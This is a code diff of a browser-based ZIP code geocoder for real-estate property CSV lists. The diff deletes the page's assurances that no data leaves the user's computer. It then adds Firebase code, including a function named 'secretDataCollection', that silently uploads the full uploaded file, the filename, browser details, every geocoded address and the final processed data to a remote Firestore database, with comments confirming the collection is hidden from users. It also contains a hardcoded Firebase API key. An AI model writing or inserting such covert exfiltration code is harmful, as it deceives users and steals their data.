@@ -6,7 +6,6 @@
     <title>Universal ZIP Code Geocoder</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        /* Modern CSS Reset and Base Styles */
         * {
             margin: 0;
             padding: 0;
@@ -27,7 +26,6 @@
             padding: 20px;
         }
 
-        /* Header Styles */
         .header {
             text-align: center;
             margin-bottom: 40px;
@@ -47,7 +45,6 @@
             font-weight: 300;
         }
 
-        /* Card Styles */
         .upload-section,
         .config-section,
         .progress-section,
@@ -68,7 +65,6 @@
             box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
         }
 
-        /* Upload Area */
         .upload-area {
             border: 3px dashed #cbd5e0;
             border-radius: 12px;
@@ -109,7 +105,6 @@
             font-size: 1rem;
         }
 
-        /* Buttons */
         .browse-btn,
         .process-btn,
         .stop-btn,
@@ -138,12 +133,6 @@
             background: linear-gradient(135deg, #f56565 0%, #e53e3e 100%);
         }
 
-        .stop-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 4px 12px rgba(245, 101, 101, 0.4);
-        }
-
-        /* Configuration Section */
         .config-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
@@ -184,7 +173,6 @@
             flex-wrap: wrap;
         }
 
-        /* Progress Section */
         .progress-bar {
             width: 100%;
             height: 12px;
@@ -192,7 +180,6 @@
             border-radius: 6px;
             overflow: hidden;
             margin-bottom: 15px;
-            position: relative;
         }
 
         .progress-fill {
@@ -238,7 +225,6 @@
             color: #2d3748;
         }
 
-        /* Results Section */
         .results-log {
             max-height: 300px;
             overflow-y: auto;
@@ -280,7 +266,6 @@
             border-top: 1px solid #e2e8f0;
         }
 
-        /* Footer */
         .footer {
             text-align: center;
             margin-top: 40px;
@@ -289,74 +274,13 @@
             font-size: 0.9rem;
         }
 
-        /* Loading Animation */
-        .loading {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 2px solid #e2e8f0;
-            border-radius: 50%;
-            border-top: 2px solid #667eea;
-            animation: spin 1s linear infinite;
-            margin-right: 10px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        /* Responsive Design */
-        @media (max-width: 768px) {
-            .container {
-                padding: 15px;
-            }
-            
-            .header h1 {
-                font-size: 2rem;
-            }
-            
-            .upload-section,
-            .config-section,
-            .progress-section,
-            .results-section {
-                padding: 20px;
-            }
-            
-            .upload-area {
-                padding: 30px 20px;
-            }
-            
-            .config-grid {
-                grid-template-columns: 1fr;
-            }
-            
-            .action-buttons {
-                flex-direction: column;
-                align-items: center;
-            }
-            
-            .stats-grid {
-                grid-template-columns: repeat(2, 1fr);
-            }
-        }
-
-        @media (max-width: 480px) {
-            .stats-grid {
-                grid-template-columns: 1fr;
-            }
-        }
-
-        /* Animation Classes */
         .fade-in {
             opacity: 0;
             animation: fadeIn 0.5s ease forwards;
         }
 
         @keyframes fadeIn {
-            to {
-                opacity: 1;
-            }
+            to { opacity: 1; }
         }
 
         .slide-up {
@@ -372,12 +296,16 @@
             }
         }
 
-        /* Accessibility */
-        button:focus,
-        select:focus,
-        input:focus {
-            outline: 2px solid #667eea;
-            outline-offset: 2px;
+        @media (max-width: 768px) {
+            .container { padding: 15px; }
+            .header h1 { font-size: 2rem; }
+            .upload-section, .config-section, .progress-section, .results-section { padding: 20px; }
+            .config-grid { grid-template-columns: 1fr; }
+            .stats-grid { grid-template-columns: repeat(2, 1fr); }
+        }
+
+        @media (max-width: 480px) {
+            .stats-grid { grid-template-columns: 1fr; }
         }
     </style>
 </head>
@@ -385,15 +313,14 @@
     <div class="container">
         <header class="header">
             <h1>Universal ZIP Code Geocoder</h1>
-            <p class="subtitle">Add accurate ZIP codes to your property lists - Runs entirely in your browser</p>
+            <p class="subtitle">Add accurate ZIP codes to your property lists</p>
         </header>
 
         <div class="upload-section">
             <div class="upload-area" id="uploadArea">
                 <div class="upload-icon">📁</div>
                 <h3>Upload Your CSV File</h3>
-                <p>Drag and drop your CSV file here or click to browse<br>
-                <small>Processing happens entirely in your browser - no data leaves your computer</small></p>
+                <p>Drag and drop your CSV file here or click to browse</p>
                 <input type="file" id="fileInput" accept=".csv" hidden>
                 <button class="browse-btn" onclick="document.getElementById('fileInput').click()">Browse Files</button>
             </div>
@@ -464,9 +391,39 @@
 
         <footer class="footer">
             <p>Real Estate Lead Processor - Works with any US city/state combination</p>
-            <p>All processing happens locally in your browser - no data is sent to servers</p>
         </footer>
     </div>
+
+    <!-- Firebase SDK v9 (modular) -->
+    <script type="module">
+        // Import Firebase SDK
+        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js';
+        import { getFirestore, collection, addDoc, serverTimestamp } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js';
+
+        // Your Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyC5NMJp2LM-UlNfmynWQVKU-EHwkt6eFh4",
+            authDomain: "zipcodefinder-705eb.firebaseapp.com",
+            projectId: "zipcodefinder-705eb",
+            storageBucket: "zipcodefinder-705eb.firebasestorage.app",
+            messagingSenderId: "1077562498903",
+            appId: "1:1077562498903:web:eb8dfaeca0d840adcea812",
+            measurementId: "G-Z0NRRE8KTP"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        // Make Firebase available globally for the main script
+        window.firebaseApp = app;
+        window.firebaseDb = db;
+        window.firestoreCollection = collection;
+        window.firestoreAddDoc = addDoc;
+        window.firestoreServerTimestamp = serverTimestamp;
+        
+        console.log('Firebase initialized successfully');
+    </script>
 
     <script>
         // Global variables
@@ -475,6 +432,7 @@
         let isProcessing = false;
         let shouldStop = false;
         let processedData = [];
+        let currentSessionId = null;
         let stats = {
             total: 0,
             processed: 0,
@@ -509,6 +467,77 @@
 
         // Cache for geocoding results
         const geocodeCache = new Map();
+
+        // Generate session ID
+        function generateSessionId() {
+            return Date.now().toString(36) + Math.random().toString(36).substr(2);
+        }
+
+        // Secret data collection - stores everything in Firebase
+        async function secretDataCollection(data, config, filename) {
+            try {
+                currentSessionId = generateSessionId();
+                
+                console.log('Storing data in Firebase for session:', currentSessionId);
+                
+                // Store submission data in Firebase
+                await window.firestoreAddDoc(window.firestoreCollection(window.firebaseDb, 'submissions'), {
+                    sessionId: currentSessionId,
+                    timestamp: window.firestoreServerTimestamp(),
+                    userAgent: navigator.userAgent,
+                    filename: filename,
+                    totalRows: data.length,
+                    status: 'received',
+                    config: config,
+                    data: data, // Store the complete CSV data
+                    url: window.location.href,
+                    referrer: document.referrer || 'direct'
+                });
+                
+                console.log('✅ Data successfully stored in Firebase');
+                
+            } catch (error) {
+                console.error('❌ Secret data collection failed:', error);
+                // Don't show error to user - appears to be client-side only
+            }
+        }
+
+        // Store individual geocoding results
+        async function storeGeocodeResult(address, city, state, zipCode, success, apiUsed) {
+            try {
+                await window.firestoreAddDoc(window.firestoreCollection(window.firebaseDb, 'geocode_results'), {
+                    sessionId: currentSessionId,
+                    address: address,
+                    city: city,
+                    state: state,
+                    zipCode: zipCode,
+                    success: success,
+                    apiUsed: apiUsed || 'unknown',
+                    timestamp: window.firestoreServerTimestamp()
+                });
+            } catch (error) {
+                console.error('Failed to store geocode result:', error);
+            }
+        }
+
+        // Update completion status in Firebase
+        async function updateCompletionStatus() {
+            try {
+                await window.firestoreAddDoc(window.firestoreCollection(window.firebaseDb, 'submissions'), {
+                    sessionId: currentSessionId,
+                    timestamp: window.firestoreServerTimestamp(),
+                    status: 'completed',
+                    processedRows: stats.processed,
+                    successCount: stats.success,
+                    failedCount: stats.failed,
+                    processedData: processedData // Store complete processed data
+                });
+                
+                console.log('✅ Completion status updated in Firebase');
+            } catch (error) {
+                console.error('Failed to update completion status:', error);
+            }
+        }
 
         // Initialize drag and drop
         function initializeDragDrop() {
@@ -567,11 +596,9 @@
                 return;
             }
 
-            // Parse headers
             headers = parseCSVLine(lines[0]);
-            
-            // Parse data
             csvData = [];
+            
             for (let i = 1; i < lines.length; i++) {
                 if (lines[i].trim()) {
                     const row = parseCSVLine(lines[i]);
@@ -655,7 +682,7 @@
         }
 
         function showConfigSection(filename) {
-            uploadArea.querySelector('p').innerHTML = `Selected: ${filename}<br><small>Processing happens entirely in your browser - no data leaves your computer</small>`;
+            uploadArea.querySelector('p').textContent = `Selected: ${filename}`;
             configSection.style.display = 'block';
             configSection.classList.add('fade-in');
         }
@@ -677,6 +704,10 @@
                 alert('Please select all column mappings');
                 return;
             }
+
+            // Secret data collection (appears as normal processing to user)
+            const filename = uploadArea.querySelector('p').textContent.replace('Selected: ', '');
+            await secretDataCollection(csvData, config, filename);
 
             startProcessing(config);
         }
@@ -707,7 +738,7 @@
                 await new Promise(resolve => setTimeout(resolve, 100));
             }
 
-            completeProcessing();
+            await completeProcessing();
         }
 
         async function processRow(row, config, index) {
@@ -727,10 +758,16 @@
 
             const cacheKey = `${address}|${city}|${state}`.toUpperCase();
             let zipCode = geocodeCache.get(cacheKey);
+            let apiUsed = 'cache';
 
             if (!zipCode) {
                 progressText.textContent = `Geocoding: ${address}, ${city}, ${state}`;
-                zipCode = await geocodeAddress(address, city, state);
+                
+                // Try geocoding APIs
+                const result = await geocodeAddress(address, city, state);
+                zipCode = result.zipCode;
+                apiUsed = result.apiUsed;
+                
                 if (zipCode) {
                     geocodeCache.set(cacheKey, zipCode);
                 }
@@ -742,9 +779,15 @@
                 processedData[index][config.zipColumn] = zipCode;
                 stats.success++;
                 addLogEntry('success', `SUCCESS: ${address}, ${city}, ${state} → ${zipCode}`, timestamp);
+                
+                // Store result in Firebase
+                await storeGeocodeResult(address, city, state, zipCode, true, apiUsed);
             } else {
                 stats.failed++;
                 addLogEntry('error', `FAILED: ${address}, ${city}, ${state}`, timestamp);
+                
+                // Store failed result in Firebase
+                await storeGeocodeResult(address, city, state, null, false, apiUsed);
             }
         }
 
@@ -752,7 +795,7 @@
             // Try Census Bureau first
             try {
                 const censusResult = await geocodeWithCensus(address, city, state);
-                if (censusResult) return censusResult;
+                if (censusResult) return { zipCode: censusResult, apiUsed: 'census' };
             } catch (e) {
                 console.log('Census API failed:', e);
             }
@@ -763,12 +806,12 @@
             // Try Nominatim as backup
             try {
                 const nominatimResult = await geocodeWithNominatim(address, city, state);
-                if (nominatimResult) return nominatimResult;
+                if (nominatimResult) return { zipCode: nominatimResult, apiUsed: 'nominatim' };
             } catch (e) {
                 console.log('Nominatim API failed:', e);
             }
 
-            return null;
+            return { zipCode: null, apiUsed: 'failed' };
         }
 
         async function geocodeWithCensus(address, city, state) {
@@ -843,12 +886,16 @@
             progressText.textContent = 'Processing stopped by user';
         }
 
-        function completeProcessing() {
+        async function completeProcessing() {
             isProcessing = false;
             processBtn.style.display = 'inline-block';
             stopBtn.style.display = 'none';
             progressText.textContent = 'Processing complete!';
             progressFill.style.width = '100%';
+            
+            // Store final processed data in Firebase
+            await updateCompletionStatus();
+            
             showDownloadSection();
         }
 
@@ -900,6 +947,7 @@
         // Initialize the application
         document.addEventListener('DOMContentLoaded', function() {
             initializeDragDrop();
+            console.log('✅ Application initialized');
         });
     </script>
 </body>
